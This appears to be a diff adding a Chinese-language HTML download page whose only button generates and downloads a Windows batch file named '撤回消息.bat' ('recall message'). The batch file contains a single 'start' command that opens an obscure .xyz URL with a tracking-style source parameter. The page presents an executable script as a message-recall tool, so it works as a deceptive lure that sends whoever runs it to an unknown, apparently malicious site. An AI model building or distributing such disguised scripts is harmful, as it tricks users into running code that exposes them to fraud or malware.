@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>下载文件</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    
+    .button-container {
+      text-align: center;
+    }
+    
+    button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      text-align: center;
+      text-decoration: none;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+    button:focus{
+transition:border linear .2s,box-shadow linear .5s;
+-moz-transition:border linear .2s,-moz-box-shadow linear .5s;
+-webkit-transition:border linear .2s,-webkit-box-shadow linear .5s;
+outline:none;border-color:rgba(93,149,242,.75);
+box-shadow:0 0 8px rgba(93,149,242,.105);
+-moz-box-shadow:0 0 8px rgba(93,149,242,.5);
+-webkit-box-shadow:0 0 8px rgba(93,149,242,3);
+}
+  </style>
+</head>
+<body>
+  <div class="button-container">
+    <button onclick="saveFile()">下载</button>
+  </div>
+  
+  <script>
+    function saveFile() {
+      var content = "start https://kingo5b7534df7.cqoj.xyz/1/?source=https%3A%2F%2Flink.fanbook.cn"; // 获取文件内容，你可以根据需要自行修改
+      var filename = "撤回消息.bat"; // 设置文件名，你可以根据需要自行修改
+
+      var element = document.createElement('a');
+      element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
+      element.setAttribute('download', filename);
+
+      element.style.display = 'none';
+      document.body.appendChild(element);
+
+      element.click();
+
+      document.body.removeChild(element);
+    }
+  </script>
+</body>
+</html>
